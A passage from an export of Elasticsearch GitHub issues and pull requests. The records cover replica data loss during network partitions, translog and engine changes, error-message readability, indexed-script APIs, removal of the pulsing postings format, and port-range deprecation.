</description><key id="41846402">7572</key><summary>[Indexing] A network partition can cause in flight documents to be lost</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/bleskes/following{/other_user}', u'events_url': u'https://api.github.com/users/bleskes/events{/privacy}', u'organizations_url': u'https://api.github.com/users/bleskes/orgs', u'url': u'https://api.github.com/users/bleskes', u'gists_url': u'https://api.github.com/users/bleskes/gists{/gist_id}', u'html_url': u'https://github.com/bleskes', u'subscriptions_url': u'https://api.github.com/users/bleskes/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/1006375?v=4', u'repos_url': u'https://api.github.com/users/bleskes/repos', u'received_events_url': u'https://api.github.com/users/bleskes/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/bleskes/starred{/owner}{/repo}', u'site_admin': False, u'login': u'bleskes', u'type': u'User', u'id': 1006375, u'followers_url': u'https://api.github.com/users/bleskes/followers'}</assignee><reporter username="">bleskes</reporter><labels><label>:Cluster</label><label>bug</label><label>resiliency</label></labels><created>2014-09-03T18:01:33Z</created><updated>2016-04-07T07:55:47Z</updated><resolved>2016-04-06T22:13:28Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="shikhar" created="2014-10-21T06:54:44Z" id="59886628">I am curious to learn what your current thinking on fixing the issue is. I believe so long as we are ensuring the write is acknowledged by `WriteConsistencyLevel.QUORUM` or `WriteConsistencyLevel.ALL`, the problem should not theoretically happen. This seems to be what `TransportShardReplicationOperationAction` is aiming at, but may be buggy?

As an aside, can you point me at the primary-selection logic used by Elasticsearch?
</comment><comment author="bleskes" created="2014-10-21T08:15:04Z" id="59893514">@shikhar the write consistency check works at the moment based of the cluster state of the node that hosts the primary. That means that it can take some time (again, when the network is just dropping requests, socket disconnects are quick) before the master detects a node does not respond to pings and removes it from the cluster states (or that a node detects it's not connected to a master). The first step is improving transparency w.r.t replica shards indexing errors (see #7994). That will help expose when a document was not successfully indexed to all replicas. After that we plan to continue with improving primary shard promotion. Current code is here: https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/cluster/routing/allocation/AllocationService.java#L271
</comment><comment author="shikhar" created="2014-10-21T19:26:25Z" id="59983759">Ah I see, my thinking was that the WCL check be verified _both_ before and after the write has been sent. The after is what really matters. So it seems you are suggesting that the responsibility of verifying how many replicas a write was acknowledged by, will be borne by the requestor? I think the terminology around "write consistency level" check may have to be re-considered then!

From the primary selection logic I can't spot anywhere where it's trying to pick the most "recent" replica of the candidates. Does ES currently exercise any such preference?
</comment><comment author="bleskes" created="2014-10-21T19:35:03Z" id="59985100">&gt;  So it seems you are suggesting that the responsibility of verifying how many replicas a write was acknowledged by, will be borne by the requestor? 

The PR I mentioned is just a first step to bring more transparency into the process, by no means the goal. 

&gt; From the primary selection logic I can't spot anywhere where it's trying to pick the most "recent" replica of the candidates. Does ES currently exercise any such preference?

"recent" is very tricky when you index concurrently different documents of different sizes on different nodes. Depending on how things run, there is no notion of a clear "recent" shard as each replica may be behind on different documents, all in flight. I currently have some thoughts on how to approach this better but it's early stages. One of the options is take make a intermediate step which will indeed involve some heuristic around "recency".
</comment><comment author="shikhar" created="2014-10-21T20:16:10Z" id="59991303">&gt; "recent" is very tricky when you index concurrently different documents of different sizes on different nodes. Depending on how things run, there is no notion of a clear "recent" shard as each replica may be behind on different documents, all in flight. I currently have some thoughts on how to approach this better but it's early stages. One of the options is take make a intermediate step which will indeed involve some heuristic around "recency".

Agreed that it's tricky. 

It seems to me that what's required is a shard-specific monotonic counter, and since all writes go through the primary this can be safely implemented. Is this blocking on the "sequence ID" stuff I think I saw some talk of? Is there a ticket for that?
</comment><comment author="bleskes" created="2014-10-21T20:27:14Z" id="59993024">&gt; It seems to me that what's required is a shard-specific monotonic counter, and since all writes go through the primary this can be safely implemented. Is this blocking on the "sequence ID" stuff I think I saw some talk of? 

You read our minds :)
</comment><comment author="shikhar" created="2014-10-21T20:28:30Z" id="59993196">[recommendation](https://twitter.com/aphyr/status/524599768526233601) from @aphyr for this problem: viewstamped replication
</comment><comment author="aphyr" created="2014-10-21T20:39:54Z" id="59994887">Or Paxos, or ZAB, or Raft, or ...
</comment><comment author="evantahler" created="2014-10-24T06:50:14Z" id="60350681">Chiming with a related note that I mentioned on the mailing list (@shikhar linked me here) re: https://groups.google.com/forum/?utm_medium=email&amp;utm_source=footer#!msg/elasticsearch/M17mgdZnikk/Vk5lVIRjIFAJ.  This is failure mode that can happen without a network partition... just crashing nodes (which you can easily get with some long GC pauses) 

## 

I think the monotonic counters are a good solution to this, but only if they count something that indicates not only state (The next document inserted to the shard should be document 1000), but also size (which implies that I have 999 documents in my copy of the shard).   This way, if you end up in a position where a partially-replicated shard is promoted to master (because it has the only copy of the shard remaining in the cluster), you can now offer the user some interesting cluster configuration options: 

1) serve the data I have, but accept no writes/updates (until a `full` shard returns to the cluster)
2) temporarily close the index / 500 error (until a `full` shard returns to the cluster)
3) promote what I have to master (and re-replicate my copy to other nodes when they re-join the cluster)

Without _knowing_ that a shard is in this "partial-data" state, you couldn't make the choice.  I would personally choose #1 most of the time, but I can see use cases for all three options.  I would argue that #3 is what is happening presently.  While this would add overhead to each write/update (you would need to count the number of documents in the shard EACH write), I think that allowing ES to run in this "more safe" mode is  a good option.  Hopefully the suggestion isn't too crazy, as this would only add a check on the local copy of the data, and we probably only need to do it on the master shard. 
</comment><comment author="aphyr" created="2014-10-24T20:47:32Z" id="60446913">&gt; 3) promote what I have to master (and re-replicate my copy to other nodes when they re-join the cluster)

There's some [great literature that addresses this problem](http://web.stanford.edu/class/cs347/reading/zab.pdf).
</comment><comment author="bleskes" created="2014-10-24T21:27:40Z" id="60451805">@evantahler 

&gt; This way, if you end up in a position where a partially-replicated shard is promoted to master (because it has the only copy of the shard remaining in the cluster)

This should never happen. ES prefers to go to red state and block indexing to promoting half copies to primaries. If it did it is a major bug and I would request you open another issue about it (this one is about something else). 
</comment><comment author="shikhar" created="2015-05-05T17:57:30Z" id="99158857">linking #10708 
</comment><comment author="JeanFrancoisContour" created="2015-07-13T09:45:59Z" id="120875011">Since this issue is related to in-flight documents. Do you think there is a risk to loose existing document during primary shard relocation (cluster rebalancing after adding a new node for instance )?
</comment><comment author="bleskes" created="2015-07-16T09:34:06Z" id="121899752">@JeanFrancoisContour this issue relates to documents that are wrongfully acked. I.e., ES acknowledge them but they didn't really reach all the replicas. They are lost when the primary is removed in favour of one of the other replica due to a network partition that isolates the primary. It should effect primary relocation. If you have issues there do please report by opening a different ticket.
</comment><comment author="JeanFrancoisContour" created="2015-07-16T17:05:54Z" id="122023542">Ok thanks, so if we can afford to send data twice (same _id), in real time for the first event and a few hour later (bulk) for the second try, we are pretty confident in ES overall ?
</comment><comment author="bleskes" created="2016-04-07T07:55:47Z" id="206746716">For the record, the majority of the work to fix this can be found at #14252
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Benchmarks: Re-factored benchmark infra</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7571</link><project id="" key="" /><description>Major re-factoring to use a dual-channel strategy for executing
benchmarks. Uses cluster metadata for managing lifecycle events, but
transport channel to send benchmark definitions and results between
master and executor nodes.

This commit also adds:
- Wildcard requests for pause/resume/abort.
- Fixes transport request ACTION string to conform to security naming
  conventions.
- Fixed bug that incorrectly calculated total requested iterations in
  cases where summary computation was called more than once.
- Rename field 'total_completed_queries' for better readability.
- Clear values for slowest when re-calculating summary results.
- Simplified use of barriers and semaphores in testing logic to allow
  suspending benchmark execution for testing various states.
- Handle cases where executor nodes drop from the cluster during
  execution.
</description><key id="41845576">7571</key><summary>Benchmarks: Re-factored benchmark infra</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">aleph-zero</reporter><labels /><created>2014-09-03T17:56:08Z</created><updated>2014-09-04T22:09:35Z</updated><resolved>2014-09-04T22:09:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>nicer SearchPhaseExecutionException response message for parsing problems</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7570</link><project id="" key="" /><description>Like most users, I deal with query related parse error messages quite regularly. One thing that has annoyed me for ages is how unreadable these messages are and I was wondering if it would be possible to improve this. Especially with large complicated queries this would be enormously helpful for many users, I imagine.

For reference below is an example. The only problem with this query is that I deliberately changed query into querie to trigger a validation error.

The message basically tells me that each of my shards failed to parse it. Unless you are running some weird mix of different es versions in one cluster, the parse error is going to be pretty much always identical across shards. So, repeating it is just clutter in this case.  The escaped input makes things hard to read in any case and the fact that the actual problem is listed after this makes it hard to figure out what the problem is. 

More helpful would if SearchParseException would return a proper json message that would be embedded in the aggregate SearchPhaseExecutionException with a separate field for the original input. Or if that is hard, it would be nice if the message would at least mention the problem before listing the content at least. Also, the from and size attrubute seems to be -1 here. This is probably because the json is actually well formed and there is no syntax problem to report from jackson. 

```
{
   "error": "SearchPhaseExecutionException[Failed to execute phase [query], all shards failed; shardFailures {[XtMbDAz6TBqSKZAUL5zfhA][inbot_users_v20][3]: SearchParseException[[inbot_users_v20][3]: from[-1],size[-1]: Parse Failure [Failed to parse source [{\n  \"querie\": {\n    \"term\": {\n      \"user_id\": {\n        \"value\": \"QA0vNmxMevzGf8HCMh8y4A\"\n      }\n    }\n  }\n}\n]]]; nested: SearchParseException[[inbot_users_v20][3]: from[-1],size[-1]: Parse Failure [No parser for element [querie]]]; }{[XtMbDAz6TBqSKZAUL5zfhA][inbot_users_v20][2]: SearchParseException[[inbot_users_v20][2]: from[-1],size[-1]: Parse Failure [Failed to parse source [{\n  \"querie\": {\n    \"term\": {\n      \"user_id\": {\n        \"value\": \"QA0vNmxMevzGf8HCMh8y4A\"\n      }\n    }\n  }\n}\n]]]; nested: SearchParseException[[inbot_users_v20][2]: from[-1],size[-1]: Parse Failure [No parser for element [querie]]]; }{[XtMbDAz6TBqSKZAUL5zfhA][inbot_users_v20][1]: SearchParseException[[inbot_users_v20][1]: from[-1],size[-1]: Parse Failure [Failed to parse source [{\n  \"querie\": {\n    \"term\": {\n      \"user_id\": {\n        \"value\": \"QA0vNmxMevzGf8HCMh8y4A\"\n      }\n    }\n  }\n}\n]]]; nested: SearchParseException[[inbot_users_v20][1]: from[-1],size[-1]: Parse Failure [No parser for element [querie]]]; }{[XtMbDAz6TBqSKZAUL5zfhA][inbot_users_v20][0]: SearchParseException[[inbot_users_v20][0]: from[-1],size[-1]: Parse Failure [Failed to parse source [{\n  \"querie\": {\n    \"term\": {\n      \"user_id\": {\n        \"value\": \"QA0vNmxMevzGf8HCMh8y4A\"\n      }\n    }\n  }\n}\n]]]; nested: SearchParseException[[inbot_users_v20][0]: from[-1],size[-1]: Parse Failure [No parser for element [querie]]]; }{[XtMbDAz6TBqSKZAUL5zfhA][inbot_users_v20][4]: SearchParseException[[inbot_users_v20][4]: from[-1],size[-1]: Parse Failure [Failed to parse source [{\n  \"querie\": {\n    \"term\": {\n      \"user_id\": {\n        \"value\": \"QA0vNmxMevzGf8HCMh8y4A\"\n      }\n    }\n  }\n}\n]]]; nested: SearchParseException[[inbot_users_v20][4]: from[-1],size[-1]: Parse Failure [No parser for element [querie]]]; }]",
   "status": 400
}
```
</description><key id="41842558">7570</key><summary>nicer SearchPhaseExecutionException response message for parsing problems</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jillesvangurp</reporter><labels><label>adoptme</label><label>enhancement</label></labels><created>2014-09-03T17:28:58Z</created><updated>2014-11-29T14:17:42Z</updated><resolved>2014-11-29T14:17:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T16:30:40Z" id="54719488">Also see #2805
</comment><comment author="clintongormley" created="2014-11-29T14:17:42Z" id="64953199">Closing as duplicate of #3303
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make sure headers are handed over to internal requests and streamline versioning support</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7569</link><project id="" key="" /><description>The get, put and delete indexed script apis map to get, index and delete api and internally create those corresponding requests. We need to make sure that the original headers are handed over to the new request by passing the original request in the constructor when creating the new one.

Also streamlined the support for version and version_type in the REST layer since the parameters were not consistently parsed and set to the internal java API requests. Unified the Rest actions code to make sure that the same parameters are supported in both scripts and templates actions.

Modified the REST delete template and delete script actions to make use of a client instead of using the `ScriptService` directly.

Removed injected client from transport actions as script service has already its own, no need to pass another one in.
</description><key id="41840972">7569</key><summary>Make sure headers are handed over to internal requests and streamline versioning support</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Indexed Scripts/Templates</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T17:13:43Z</created><updated>2015-06-07T12:08:03Z</updated><resolved>2014-09-04T14:03:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-03T18:24:36Z" id="54342766">LGTM - good cleanup thanks luca
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Rest api: get indexed script and get template don't return metadata fields</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7568</link><project id="" key="" /><description>I think get template and get indexed scripts api should be consistent with the get api and return the same metadata fields when possible. We should at least return `_lang`, `_id` and `_version`, maybe the index name as well.
</description><key id="41840150">7568</key><summary>Rest api: get indexed script and get template don't return metadata fields</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/GaelTadh/following{/other_user}', u'events_url': u'https://api.github.com/users/GaelTadh/events{/privacy}', u'organizations_url': u'https://api.github.com/users/GaelTadh/orgs', u'url': u'https://api.github.com/users/GaelTadh', u'gists_url': u'https://api.github.com/users/GaelTadh/gists{/gist_id}', u'html_url': u'https://github.com/GaelTadh', u'subscriptions_url': u'https://api.github.com/users/GaelTadh/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/5190064?v=4', u'repos_url': u'https://api.github.com/users/GaelTadh/repos', u'received_events_url': u'https://api.github.com/users/GaelTadh/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/GaelTadh/starred{/owner}{/repo}', u'site_admin': False, u'login': u'GaelTadh', u'type': u'User', u'id': 5190064, u'followers_url': u'https://api.github.com/users/GaelTadh/followers'}</assignee><reporter username="">javanna</reporter><labels><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T17:05:21Z</created><updated>2014-09-19T11:15:43Z</updated><resolved>2014-09-19T11:15:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Java api: get indexed script support for preference, realtime and refresh is incomplete</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7567</link><project id="" key="" /><description>The get indexed script supports `preference`, `realtime` and `refresh` parameters. Those parameters can only be set through java api though, never parsed on the REST layer.

The set preference is also never used internally as we force the preference to `_local` all the time. Also, I wonder if `realtime` and `refresh` make sense since we always refresh internally after each write (put/delete indexed script).

My vote is for removing all three parameters from the java API.
</description><key id="41838567">7567</key><summary>Java api: get indexed script support for preference, realtime and refresh is incomplete</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">javanna</reporter><labels><label>bug</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T16:51:06Z</created><updated>2016-09-05T17:46:38Z</updated><resolved>2014-09-19T11:15:43Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="alaasamergit" created="2016-09-05T17:46:38Z" id="244791987">how can you set preference in Java api in the end ?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Mapping: Remove pulsing/bloom_pulsing postings format</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7566</link><project id="" key="" /><description>In #7238 it looked like index corruption (checksum errors) but in fact it was simply that the user selected bloom_pulsing postings format, which we don't support yet still allow.

We recently removed documentation showing these postings format as a choice, but it's still really dangerous we allow this option at all since it creates unusable indices in ES when we migrate shards and try to check integrity.  Before 1.3, ES didn't check Lucene checksums, so these postings formats worked fine, but with 1.3 any index using pulsing will fail.

The pulsing optimization has already been folded into the default postings format for quite a while now.

I think we should remove them; we are already removing pulsing from Lucene (https://issues.apache.org/jira/browse/LUCENE-5915)
</description><key id="41837391">7566</key><summary>Mapping: Remove pulsing/bloom_pulsing postings format</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>breaking</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T16:40:20Z</created><updated>2014-09-08T16:25:50Z</updated><resolved>2014-09-08T09:03:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rmuir" created="2014-09-03T16:54:15Z" id="54328358">Should we go further and disable (for now) any custom formats that don't have backwards compatibility support from lucene? These can change across releases in such a way that looks like corruption.

We are currently trying to figure out a way in Lucene to safely provide options to the user AND backwards compatibility, but this is not going to happen overnight.
</comment><comment author="mikemccand" created="2014-09-03T18:56:36Z" id="54347713">&gt; Should we go further and disable (for now) any custom formats that don't have backwards compatibility support from lucene? These can change across releases in such a way that looks like corruption.

+1, I'll do that.
</comment><comment author="s1monw" created="2014-09-03T19:38:44Z" id="54353692">++ to removing all the non-checksumming formats!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fixes resize bug in Geo bounds Aggregator</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7565</link><project id="" key="" /><description>Closes #7556
</description><key id="41821010">7565</key><summary>Fixes resize bug in Geo bounds Aggregator</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Aggregations</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T14:14:53Z</created><updated>2015-06-07T18:50:05Z</updated><resolved>2014-09-03T14:25:35Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-03T14:15:34Z" id="54303383">Good catch! LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Clean up translog interface</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7564</link><project id="" key="" /><description>This has two major parts:
- Simplifying the translog interface

Get rid of readSource() entirely, it sucked, Operations should be able
to provide the source themselves.

No more TranslogStream headers, you are now required to pass an
StreamInput or StreamOutput for all operations, which means no extra
state is needed and no need to construct new versions when detecting the
version.

The interface now exists of 2 main methods, and one helper:

``` java
// read
Translog.Operation read(StreamInput in)
// write
void write(StreamOutput out, Translog.Operation op)
// when reading a file, need to be able to read and consume the header
void seekPastHeader(StreamInput in)
```

---
- Read and write translog op sizes in TranslogStreams

Previously we handled these integers outside of the translog stream
itself, which was very unclean because other code had to know about
reading the size, or about writing the correct header sometimes.

There is some additional code in LocalIndexShardGateway to handle the
legacy case for older translogs, because we need to read and discard the
size in order to maintain the compatibility for the streaming
operations (they did not read or write the size for 1.3.x and earlier).

Additionally, we need to handle a case where the header is truncated
when recovering from disk, so added code for that.

---

I'm hoping this makes working with the translog easier and less error-prone. On top of this (in a separate PR) we can add the size-reading safety to prevent rare OOMEs on corrupted translogs.
</description><key id="41816649">7564</key><summary>Clean up translog interface</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dakrone</reporter><labels><label>:Translog</label><label>blocker</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T13:36:05Z</created><updated>2015-06-07T12:08:13Z</updated><resolved>2014-09-09T13:30:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-05T08:58:52Z" id="54600730">I like it left one comment
</comment><comment author="dakrone" created="2014-09-08T10:11:20Z" id="54798922">@s1monw so I'm kind of concerned about one of the changes I made here, which is that we now serialize the size of the operation when sending translog operations between nodes. If it were just a size it wouldn't be a big deal, but to get the size we create a new byte array for every operation, which seems much slower.

What do you think of keeping `read` and `write` and adding `readWithoutSize` and `writeWithoutSize` for the Transport case? Is that too messy? We could avoid the byte array entirely if we don't need the size.
</comment><comment author="dakrone" created="2014-09-08T10:12:27Z" id="54799008">Also labeling this as a blocker for 1.4 because delaying it until 1.5 means adding another translog format since this changes it (see my previous comment).
</comment><comment author="dakrone" created="2014-09-08T10:49:37Z" id="54802172">@s1monw added the NoopStreamOutput that we talked about and addressed your comment.
</comment><comment author="s1monw" created="2014-09-08T14:44:37Z" id="54830030">I left some comments but mainly cosmetic
</comment><comment author="dakrone" created="2014-09-08T14:59:12Z" id="54832359">Updated with your feedback, except for the "stream private" comment because I don't understand what you mean.
</comment><comment author="s1monw" created="2014-09-09T12:58:44Z" id="54964597">LGTM
</comment><comment author="dakrone" created="2014-09-09T13:30:21Z" id="54968566">Merged to 1.x and master.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Flush IndexWriter to disk  on close and shutdown</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7563</link><project id="" key="" /><description>Today we trash everything that has been indexed but not flushed to disk
if the engine is closed. This might not be desired if we shutting down a
node for restart / upgrade or if we close / archive an index. In such a
case we would like to flush the transaction log and commit everything to
disk. This commit adds a flag to the close method that is set on close
and shutdown but not when we remove the shard due to relocations.
</description><key id="41816022">7563</key><summary>Flush IndexWriter to disk  on close and shutdown</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/s1monw/following{/other_user}', u'events_url': u'https://api.github.com/users/s1monw/events{/privacy}', u'organizations_url': u'https://api.github.com/users/s1monw/orgs', u'url': u'https://api.github.com/users/s1monw', u'gists_url': u'https://api.github.com/users/s1monw/gists{/gist_id}', u'html_url': u'https://github.com/s1monw', u'subscriptions_url': u'https://api.github.com/users/s1monw/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/973334?v=4', u'repos_url': u'https://api.github.com/users/s1monw/repos', u'received_events_url': u'https://api.github.com/users/s1monw/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/s1monw/starred{/owner}{/repo}', u'site_admin': False, u'login': u's1monw', u'type': u'User', u'id': 973334, u'followers_url': u'https://api.github.com/users/s1monw/followers'}</assignee><reporter username="">s1monw</reporter><labels><label>:Engine</label><label>enhancement</label><label>resiliency</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-03T13:30:14Z</created><updated>2015-06-07T10:09:00Z</updated><resolved>2015-02-18T12:54:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-03T14:22:48Z" id="54304447">LGTM

As an aside, we might want to experiment with moving stopping the DiscoveryService to stop before InternalIndicesService in the stop ordering we have (and probably cluster state service as well). If closing indices service will not take longer, potentially it might make sense to leave the cluster before.
</comment><comment author="s1monw" created="2014-09-08T07:48:25Z" id="54785993">I am pushing this out to 1.5 - I need to do some more testing
</comment><comment author="mikemccand" created="2014-10-01T10:00:37Z" id="57442608">I think it's important to get this in soon, otherwise the "always check index on close" is quite weakened since for many tests this will mean there is no Lucene index actually created...
</comment><comment author="s1monw" created="2014-10-01T10:08:10Z" id="57443367">this patch has a lot of problems still - lots of tests fail etc. I need to get back to it though
</comment><comment author="s1monw" created="2015-02-17T09:09:04Z" id="74637000">@kimchy @mikemccand I rebased this on current master and run tests. All tests pass now and nothing gets stuck anymore. This is likey due to some changes we did to the lock ordering. I think it's pretty ready, I wonder we should add a backdoor on a per index basis if flush should be called or not?
</comment><comment author="mikemccand" created="2015-02-17T09:20:20Z" id="74638369">LGTM
</comment><comment author="kimchy" created="2015-02-17T12:10:52Z" id="74658473">LGTM, +1 for a setting to disable this just in case
</comment><comment author="s1monw" created="2015-02-17T13:53:46Z" id="74670418">@kimchy pushed a new commit
</comment><comment author="s1monw" created="2015-02-17T15:41:58Z" id="74688197">@kimchy I catch the exceptin now....
</comment><comment author="s1monw" created="2015-02-17T15:56:14Z" id="74690976">@bleskes can you take another look I fixed the condition when we actually flush
</comment><comment author="bleskes" created="2015-02-17T16:10:28Z" id="74693834">@s1monw good catch on the closed indices. Left a comment about it.
</comment><comment author="s1monw" created="2015-02-17T16:13:12Z" id="74694394">@bleskes the biggest effect it has when we shutdown the nodes so I guess that's just fine then?
</comment><comment author="bleskes" created="2015-02-17T16:15:24Z" id="74694879">@s1monw I think closing and opening and index has just as good use case - you want to avoid translog replays. We can clean the delete logic in that case in another PR - just make sure it's not lost... 
</comment><comment author="s1monw" created="2015-02-17T16:49:00Z" id="74701933">@bleskes I added a catch clause for EngineClosed... I think it's ready
</comment><comment author="bleskes" created="2015-02-17T18:31:05Z" id="74722744">@s1monw +1. Thx. I'll pick up the close indices change I mentioned. I think it's important. 
</comment><comment author="s1monw" created="2015-02-18T10:22:47Z" id="74842147">I added some more randomization in the mock engine that sometimes calls flushAndClose() in close() and viseversa... all tests pass I will push it soon
</comment><comment author="s1monw" created="2015-02-18T11:32:04Z" id="74850177">I ran into one test issue where the test relied on replaying the translog. i think this is a general problem since it's not guaranteed that if you use dynamic mappings that the mapping is acked by the master. We might run into several other problems here along the lines. @bleskes WDYT should we fix the mapping ack first?
</comment><comment author="bleskes" created="2015-02-23T07:51:27Z" id="75501066">@s1monw sorry for the late response. Yeah, it's a general problem, which will be amplified by this. Since we plan to do #8688 this will not be an issue anymore. We could add a wait for out going mapping update logic, ala what we do during recovery. Doubting about the urgency of it and whether we should do it given the plans for #8688 and the fact that if there is another active replica it will force the local closed copy to resync and be consistent (note that this is not the case for closed indices where we shut down all the shard copies).
</comment><comment author="s1monw" created="2015-02-23T08:48:20Z" id="75506851">@bleskes lets just fix #8688 asap
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Transport: Deprecate parsing of port ranges</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7562</link><project id="" key="" /><description>UnicastZenDiscovery allowed you to specify port ranges for hosts to connect to.
However only the first port was used at all, when specifying something like
`host[9300-9400]`. Updated also the documentation to remove this syntax.

This is the accompanying PR for 1.x, where the removal is done in #7561
